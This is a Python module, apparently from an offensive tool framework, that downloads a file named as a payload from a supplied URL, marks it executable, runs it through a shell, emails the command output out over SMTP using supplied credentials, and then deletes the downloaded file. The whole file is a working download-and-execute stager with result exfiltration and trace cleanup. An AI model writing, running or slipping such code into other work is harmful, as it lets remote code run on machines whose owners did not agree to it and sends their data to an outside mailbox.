#!/usr/bin/env python3
import os
import smtplib
import subprocess
import tempfile
import urllib.parse
import requests
from core.banner import info, success, warn, error

def send_mail(email, password, message, server_host='smtp.gmail.com', server_port=587):
    server = smtplib.SMTP(server_host, server_port)
    server.starttls()
    server.login(email, password)
    subject = 'Subject: NetworkSecurity Execution Report\n\n'
    server.sendmail(email, email, subject + message)
    server.quit()

def run(args):
    url = args.url
    if not url:
        error('Payload URL (-u / --url) is required.')
        return 1
    command = args.command
    parsed = urllib.parse.urlparse(url)
    filename = os.path.basename(parsed.path) or 'payload.bin'
    temp_dir = tempfile.gettempdir()
    filepath = os.path.join(temp_dir, filename)
    info(f'Downloading artifact from {url} to {filepath}...')
    try:
        resp = requests.get(url, timeout=15)
        with open(filepath, 'wb') as f:
            f.write(resp.content)
        success(f'Artifact downloaded successfully ({len(resp.content)} bytes).')
    except Exception as e:
        error(f'Download failed: {e}')
        return 1
    if not command:
        if filename.endswith('.py'):
            command = f'python3 {filepath}'
        elif filename.endswith('.sh'):
            os.chmod(filepath, 493)
            command = f'/bin/bash {filepath}'
        else:
            os.chmod(filepath, 493)
            command = filepath
    info(f'Executing command: {command}')
    output = ''
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode('utf-8', errors='ignore')
        success('Execution completed successfully.')
    except subprocess.CalledProcessError as e:
        output = e.output.decode('utf-8', errors='ignore') if e.output else str(e)
        warn(f'Process exited with non-zero status.')
    except Exception as e:
        output = f'Execution error: {e}'
        error(output)
    if args.email and args.password:
        info(f'Dispatching execution report to {args.email}...')
        try:
            send_mail(args.email, args.password, output)
            success('Email report dispatched.')
        except Exception as e:
            error(f'Email delivery failed: {e}')
    else:
        info('Execution Output:\n')
        print(output)
    if not args.no_delete:
        try:
            if os.path.exists(filepath):
                os.remove(filepath)
                info(f"Cleaned up temporary artifact '{filepath}'.")
        except Exception as e:
            warn(f'Could not remove temporary file: {e}')
    return 0
